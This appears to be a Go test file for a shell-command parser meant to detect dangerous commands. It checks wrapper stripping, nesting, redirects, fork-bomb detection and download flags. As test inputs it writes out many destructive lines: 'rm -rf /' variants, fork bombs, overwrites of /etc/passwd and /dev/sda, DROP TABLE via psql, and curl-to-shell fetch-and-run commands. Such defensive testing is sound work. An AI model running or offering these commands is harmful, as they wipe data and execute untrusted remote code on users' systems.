package shellparse

import (
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"
)

// names lists every command found, pipeline by pipeline, as "a|b" strings.
func names(r *Result) []string {
	var out []string
	for _, p := range r.Pipelines {
		var ns []string
		for _, c := range p.Cmds {
			ns = append(ns, c.Name)
		}
		out = append(out, strings.Join(ns, "|"))
	}
	return out
}

func find(r *Result, name string) *Command {
	for _, p := range r.Pipelines {
		for i := range p.Cmds {
			if p.Cmds[i].Name == name {
				return &p.Cmds[i]
			}
		}
	}
	return nil
}

func mustParse(t *testing.T, line string) *Result {
	t.Helper()
	r, err := Parse(line)
	if err != nil {
		t.Fatalf("Parse(%q): %v", line, err)
	}
	return r
}

func TestStructure(t *testing.T) {
	tests := []struct {
		line string
		want []string
	}{
		{"ls -la", []string{"ls"}},
		{"cat f | grep x | wc -l", []string{"cat|grep|wc"}},
		{"make && make install || echo failed", []string{"make", "make", "echo"}},
		{"(cd /tmp && rm x)", []string{"cd", "rm"}},
		{"for f in *; do rm $f; done", []string{"rm"}},
		{"if true; then rm x; fi", []string{"true", "rm"}},
		{"echo $(rm x)", []string{"rm", "echo"}},
		{"bash -c 'rm -rf /'", []string{"rm", "bash"}},
		{`eval "rm x"`, []string{"rm", "eval"}},
		{"ssh host 'rm -rf /srv'", []string{"rm", "ssh"}},
		{"", nil},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			got := names(mustParse(t, tt.line))
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("names = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestWrappersAreStripped(t *testing.T) {
	tests := []struct {
		line     string
		name     string
		sudo     bool
		xargs    bool
		wantArgs []string
	}{
		{"sudo rm -rf /tmp/x", "rm", true, false, []string{"-rf", "/tmp/x"}},
		{"sudo -u bob rm x", "rm", true, false, []string{"x"}},
		{"doas rm x", "rm", true, false, []string{"x"}},
		{"env FOO=1 BAR=2 rm x", "rm", false, false, []string{"x"}},
		{"nohup nice -n 5 rm x", "rm", false, false, []string{"x"}},
		{"timeout 30 rm x", "rm", false, false, []string{"x"}},
		{"command rm x", "rm", false, false, []string{"x"}},
		{"xargs -n 1 rm -f", "rm", false, true, []string{"-f"}},
		{"sudo env A=1 xargs rm", "rm", true, true, nil},
		{"exec -a ls rm -rf /", "rm", false, false, []string{"-rf", "/"}},
		{"sudo -iu root rm -rf /", "rm", true, false, []string{"-rf", "/"}},
		{"sudo -uroot rm -rf /", "rm", true, false, []string{"-rf", "/"}},
		{"sudo --user root rm -rf /", "rm", true, false, []string{"-rf", "/"}},
		{"sudo -T 5 -R /srv -c cls -a bsd rm -rf /", "rm", true, false, []string{"-rf", "/"}},
		{"sudo --chroot /srv --command-timeout 5 --login-class c rm -rf /", "rm", true, false, []string{"-rf", "/"}},
		{"timeout --signal KILL 5 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
		{"stdbuf -o 0 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
		{"nice --adjustment 5 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
		{"ionice --class 2 --classdata 4 rm -rf /", "rm", false, false, []string{"-rf", "/"}},
		{"xargs --max-args 1 rm -rf", "rm", false, true, []string{"-rf"}},
		{"xargs -n1 rm -rf", "rm", false, true, []string{"-rf"}},
		{"xargs -ri rm -rf {}", "rm", false, true, []string{"-rf", "{}"}},
		{"xargs -i rm -rf {}", "rm", false, true, []string{"-rf", "{}"}},
		{"xargs -l rm -rf", "rm", false, true, []string{"-rf"}},
		{"env -S 'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
		{"env -S'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
		{"env -iS 'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
		{"env -vS 'rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
		{`env -S 'rm\_-rf\_/'`, "rm", false, false, []string{"-rf", "/"}},
		{"env --split-string='rm -rf /'", "rm", false, false, []string{"-rf", "/"}},
		{"env --split-string 'FOO=1 sudo rm -rf /'", "rm", true, false, []string{"-rf", "/"}},
		{"env -iu HOME rm -rf /", "rm", false, false, []string{"-rf", "/"}},
		{"env --unset HOME rm -rf /", "rm", false, false, []string{"-rf", "/"}},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			c := find(mustParse(t, tt.line), tt.name)
			if c == nil {
				t.Fatalf("no %q command found", tt.name)
			}
			if c.Sudo != tt.sudo || c.ViaXargs != tt.xargs {
				t.Errorf("sudo=%v xargs=%v, want sudo=%v xargs=%v", c.Sudo, c.ViaXargs, tt.sudo, tt.xargs)
			}
			if !slices.Equal(c.Args, tt.wantArgs) {
				t.Errorf("args = %v, want %v", c.Args, tt.wantArgs)
			}
		})
	}
}

func TestNestedContext(t *testing.T) {
	if c := find(mustParse(t, "ssh prod-1 'rm -rf /srv/data'"), "rm"); c == nil || c.Remote != "prod-1" {
		t.Errorf("ssh inner command should be marked remote prod-1, got %+v", c)
	}
	if c := find(mustParse(t, "ssh -p 2222 -i key host 'ls'"), "ls"); c == nil || c.Remote != "host" {
		t.Errorf("ssh options with values should be skipped, got %+v", c)
	}
	if c := find(mustParse(t, `find / -name '*.tmp' -exec rm {} \;`), "rm"); c == nil || !c.ViaFind {
		t.Errorf("find -exec command should be marked ViaFind, got %+v", c)
	}
	if c := find(mustParse(t, "bash <(curl -s http://x.example/install)"), "bash"); c == nil || !c.Downloads {
		t.Errorf("process substitution that downloads should set Downloads, got %+v", c)
	}
	for _, line := range []string{
		"bash -lc 'rm -rf ~'", "bash -xc 'rm -rf ~'", "sh -ec 'rm -rf ~'", "bash -c -- 'rm -rf ~'",
		"bash -c -e 'rm -rf ~'", "bash -c -x 'rm -rf ~'", "bash -Oc extglob 'rm -rf ~'",
		"bash -co posix 'rm -rf ~'", "bash -oc posix 'rm -rf ~'", "bash --norc -c 'rm -rf ~'",
		`find . -exec sh -c 'rm -rf /' \;`, "find . -exec bash -c 'rm -rf ~' {} +",
	} {
		if find(mustParse(t, line), "rm") == nil {
			t.Errorf("%q: the code after -c was not analysed", line)
		}
	}
	for _, line := range []string{"bash -c", "bash -c --", "bash -x 'rm -rf ~'", "bash -o posix", "bash -"} {
		if got := names(mustParse(t, line)); len(got) != 1 {
			t.Errorf("%q: found commands %v, want only the shell", line, got)
		}
	}
}

// Each -exec belongs to the find that is its inner command, so nesting must
// cost one pass per level, not a rescan of every inner word.
func nestedFind(n int) string {
	return "find . " + strings.Repeat("-exec find . ", n) + "-exec rm -rf / " + strings.Repeat(`\; `, n+1)
}

func TestNestedFindExecIsLinear(t *testing.T) {
	start := time.Now()
	r := mustParse(t, nestedFind(40))
	if d := time.Since(start); d > time.Second {
		t.Errorf("40 nested -exec took %v", d)
	}
	if len(r.Pipelines) == 0 {
		t.Error("nothing was found")
	}
}

func BenchmarkNestedFindExec(b *testing.B) {
	line := nestedFind(40)
	for b.Loop() {
		if _, err := Parse(line); err != nil {
			b.Fatal(err)
		}
	}
}

func TestRedirects(t *testing.T) {
	c := find(mustParse(t, "echo hi > out.txt 2>> err.log"), "echo")
	want := []Redirect{{">", "out.txt"}, {">>", "err.log"}}
	if c == nil || !reflect.DeepEqual(c.Redirs, want) {
		t.Fatalf("redirects = %+v, want %v", c, want)
	}
	// A redirect with no command still has to be seen: `> file` truncates it.
	r := mustParse(t, "> important.db")
	if len(r.Pipelines) != 1 || r.Pipelines[0].Cmds[0].Name != "" || len(r.Pipelines[0].Cmds[0].Redirs) != 1 {
		t.Errorf("bare redirect not captured: %+v", r.Pipelines)
	}
	// So is one left over after exec or command strips off.
	for _, line := range []string{"exec > /etc/passwd", "exec 3> /dev/sda", "command > /dev/sda", "ls | exec > /etc/passwd"} {
		found := false
		for _, p := range mustParse(t, line).Pipelines {
			for _, c := range p.Cmds {
				found = found || (c.Name == "" && len(c.Redirs) == 1)
			}
		}
		if !found {
			t.Errorf("%q: the redirect was dropped", line)
		}
	}
	if got := names(mustParse(t, "exec")); len(got) != 0 {
		t.Errorf("a bare exec has nothing to rate, got %v", got)
	}
}

func TestVariablesAndQuotesAreFlattened(t *testing.T) {
	c := find(mustParse(t, `rm -rf "$HOME/my dir" '/tmp/a b' ~/x`), "rm")
	want := []string{"-rf", "$HOME/my dir", "/tmp/a b", "~/x"}
	if c == nil || !reflect.DeepEqual(c.Args, want) {
		t.Errorf("args = %v, want %v", c.Args, want)
	}
}

func TestForkBomb(t *testing.T) {
	for _, line := range []string{":(){ :|:& };:", "bomb(){ bomb|bomb& }; bomb"} {
		if !mustParse(t, line).ForkBomb {
			t.Errorf("%q not detected as a fork bomb", line)
		}
	}
	if mustParse(t, "f(){ echo hi; }; f").ForkBomb {
		t.Error("harmless function flagged as a fork bomb")
	}
}

func TestBackgroundFlag(t *testing.T) {
	if c := find(mustParse(t, "sleep 100 &"), "sleep"); c == nil || !c.Background {
		t.Errorf("background not recorded: %+v", c)
	}
}

func TestParseErrors(t *testing.T) {
	for _, line := range []string{"echo 'unterminated", "if then", "echo $(", "a | | b"} {
		if _, err := Parse(line); err == nil {
			t.Errorf("Parse(%q) should fail", line)
		}
	}
}

func TestNestingDepthIsBounded(t *testing.T) {
	line := "rm x"
	for i := 0; i < 7; i++ { // one more than maxDepth; each level quadruples the length
		line = "sh -c '" + strings.ReplaceAll(line, "'", `'\''`) + "'"
	}
	if _, err := Parse(line); err != nil {
		t.Fatalf("deeply nested input must not error or hang: %v", err)
	}
}

func TestCommandString(t *testing.T) {
	c := Command{Name: "rm", Args: []string{"-rf", "x"}}
	if got := c.String(); got != "rm -rf x" {
		t.Errorf("String() = %q", got)
	}
	c.Sudo = true
	if got := c.String(); got != "sudo rm -rf x" {
		t.Errorf("String() with sudo = %q, want the sudo prefix kept", got)
	}
}

func FuzzParse(f *testing.F) {
	for _, s := range []string{"ls", "rm -rf /", "a | b && c", "bash -c 'x'", ":(){ :|:& };:", "echo $(echo `x`)", "ssh h 'y'", "find . -exec rm {} +"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		_, _ = Parse(s) // must never panic or hang
	})
}

func TestStdinFromPipeHereStringAndHeredoc(t *testing.T) {
	if c := find(mustParse(t, `echo "DROP TABLE users" | psql`), "psql"); c == nil || !strings.Contains(c.Stdin, "DROP TABLE users") {
		t.Errorf("pipe from echo should become Stdin: %+v", c)
	}
	if c := find(mustParse(t, `psql <<< "TRUNCATE t"`), "psql"); c == nil || !strings.Contains(c.Stdin, "TRUNCATE t") {
		t.Errorf("here-string should become Stdin: %+v", c)
	}
	if c := find(mustParse(t, "psql <<EOF\nDROP TABLE x;\nEOF"), "psql"); c == nil || !strings.Contains(c.Stdin, "DROP TABLE x") {
		t.Errorf("here-document should become Stdin: %+v", c)
	}
}

func TestShellReadingStdinIsParsed(t *testing.T) {
	for _, line := range []string{`echo "rm -rf /" | sh`, `echo "rm -rf /" | sudo bash`, "bash <<EOF\nrm -rf /\nEOF",
		`echo 'rm -rf ~' | bash -s -- -lc`, `echo 'rm -rf ~' | bash -s -- -c`} {
		if find(mustParse(t, line), "rm") == nil {
			t.Errorf("%q: code fed to a shell on stdin was not analysed", line)
		}
	}
	// A shell running a named script is not reading stdin.
	if find(mustParse(t, `echo "rm -rf /" | bash script.sh`), "rm") != nil {
		t.Error("bash script.sh must not execute the echoed text")
	}
	for _, line := range []string{`echo "rm -rf /" | bash -xc`, `echo "rm -rf /" | bash -lc 'ls'`} {
		if find(mustParse(t, line), "rm") != nil {
			t.Errorf("%q: text that is not run as code was analysed", line)
		}
	}
}

func TestCwdTracking(t *testing.T) {
	cwd := func(line, name string) string {
		c := find(mustParse(t, line), name)
		if c == nil {
			t.Fatalf("%q: no %s", line, name)
		}
		return c.Cwd
	}
	tests := []struct {
		line, name, want string
	}{
		{"rm x", "rm", ""},
		{"cd /etc && rm x", "rm", "/etc"},
		{"cd /etc; rm x", "rm", "/etc"},
		{"cd /etc && cd .. && rm x", "rm", "/"},
		{"cd /var && cd log && rm x", "rm", "/var/log"},
		{"cd sub && rm x", "rm", "sub"},
		{"cd && rm x", "rm", "~"},
		{"cd ~/work && rm x", "rm", "~/work"},
		{"cd $DIR && rm x", "rm", "?"},
		{"cd - && rm x", "rm", "?"},
		{"(cd /etc && ls); rm x", "rm", ""},            // subshell does not leak
		{"echo $(cd /etc; pwd); rm x", "rm", ""},       // neither does a substitution
		{"{ cd /etc; rm x; }", "rm", "/etc"},           // a brace group does
		{"if true; then cd /etc; fi; rm x", "rm", "?"}, // conditional cd: unknown
		{"cd /etc && rm x && cd /usr && rm y", "rm", "/etc"},
	}
	for _, tt := range tests {
		if got := cwd(tt.line, tt.name); got != tt.want {
			t.Errorf("%q: cwd = %q, want %q", tt.line, got, tt.want)
		}
	}
}

func TestInlineCode(t *testing.T) {
	for _, tc := range []struct {
		c    Command
		want string
	}{
		{Command{Name: "python3", Args: []string{"-c", "print(1)"}}, "print(1)"},
		{Command{Name: "perl", Args: []string{"-e", "x"}}, "x"},
		{Command{Name: "node", Args: []string{"-e", "y"}}, "y"},
		{Command{Name: "python3", Args: []string{"script.py"}}, ""},
		{Command{Name: "python3", Args: []string{"-c"}}, ""},
		{Command{Name: "ls", Args: []string{"-c", "x"}}, ""},
	} {
		if got := InlineCode(tc.c); got != tc.want {
			t.Errorf("InlineCode(%v) = %q, want %q", tc.c, got, tc.want)
		}
	}
}

func TestEmbeddedShellInInterpreters(t *testing.T) {
	for _, line := range []string{
		`python3 -c "import os; os.system('rm -rf /')"`,
		`python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/'])"`,
		`python3 -c 'import subprocess; subprocess.call("rm -rf /", shell=True)'`,
		`perl -e 'system("rm -rf /")'`,
		`ruby -e 'system("rm -rf /")'`,
		`node -e "require('child_process').execSync('rm -rf /')"`,
	} {
		if find(mustParse(t, line), "rm") == nil {
			t.Errorf("%q: embedded rm not found", line)
		}
	}
	if r := mustParse(t, `python3 -c "print('rm -rf /')"`); find(r, "rm") != nil {
		t.Error("a printed string is not a command")
	}
}

// Other ways of writing the same program must not hide it from the rules.
func TestProgramNameIsNormalised(t *testing.T) {
	tests := map[string]string{
		`\rm -rf ~`:                   "rm",
		`/bin/rm -rf ~`:               "rm",
		`/usr/bin/rm -rf ~`:           "rm",
		`busybox rm -rf ~`:            "rm",
		`/usr/bin/sudo /bin/rm -rf ~`: "rm",
		`\sudo rm -rf ~`:              "rm",
		`./rm -rf ~`:                  "./rm",
		`/home/me/bin/rm -rf ~`:       "/home/me/bin/rm",
		`/opt/tool/bin/rm -rf ~`:      "/opt/tool/bin/rm",
	}
	for line, want := range tests {
		r, err := Parse(line)
		if err != nil {
			t.Fatalf("%s: %v", line, err)
		}
		if got := r.Pipelines[0].Cmds[0].Name; got != want {
			t.Errorf("%s: name = %q, want %q", line, got, want)
		}
	}
}

// A $(...) that downloads is recorded against the argument it sits in, so the
// rules can tell eval "$(curl ...)" (runs it) from  echo "$(curl ...)"  (prints it).
func TestFetchedArgs(t *testing.T) {
	tests := []struct {
		line string
		want []int
	}{
		{`eval "$(curl -s https://x.sh)"`, []int{0}},
		{`sh -c "$(wget -qO- https://x.sh)"`, []int{1}},
		{`sudo bash -c "$(\curl -s https://x.sh)"`, []int{1}},
		{`eval "$(curl -s https://x.sh | tr a b)"`, []int{0}},
		{`eval "$(ssh-agent -s)"`, nil},
		{`bash deploy.sh "$(date)"`, nil},
	}
	for _, tc := range tests {
		r, err := Parse(tc.line)
		if err != nil {
			t.Fatalf("%s: %v", tc.line, err)
		}
		c := find(r, strings.Fields(strings.TrimPrefix(tc.line, "sudo "))[0])
		if c == nil {
			t.Fatalf("%s: command not found", tc.line)
		}
		got := c.FetchedArgs
		if !slices.Equal(got, tc.want) {
			t.Errorf("%s: FetchedArgs = %v, want %v", tc.line, got, tc.want)
		}
	}
}

func TestEnvSplitOddInput(t *testing.T) {
	tests := []struct {
		line string
		want []string
	}{
		{"env -S", nil},
		{"env -S ''", []string{"env"}},
		{"env -S '('", []string{"env"}},
		{"env -S 'ls | rm -rf /'", []string{"env"}},
		{"env -S 'ls -l'", []string{"ls"}},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			if got := names(mustParse(t, tt.line)); !reflect.DeepEqual(got, tt.want) {
				t.Errorf("names = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestChangesShell(t *testing.T) {
	for line, want := range map[string]bool{
		"f() { :; }": true, "PATH=/x": true, "declare -x A=1": true, "source ./x": true, "export A=1": true,
		"ls; eval $x": true, "alias ll='ls -l'": true, ". ./env": true,
		"echo 'export'": false, "grep alias f": false, "./trap.sh": false, "ls -la": false, "A=1 ls": false,
	} {
		r, err := Parse(line)
		if err != nil {
			t.Fatalf("%q: %v", line, err)
		}
		if r.ChangesShell != want {
			t.Errorf("%q: ChangesShell = %v, want %v", line, r.ChangesShell, want)
		}
	}
}
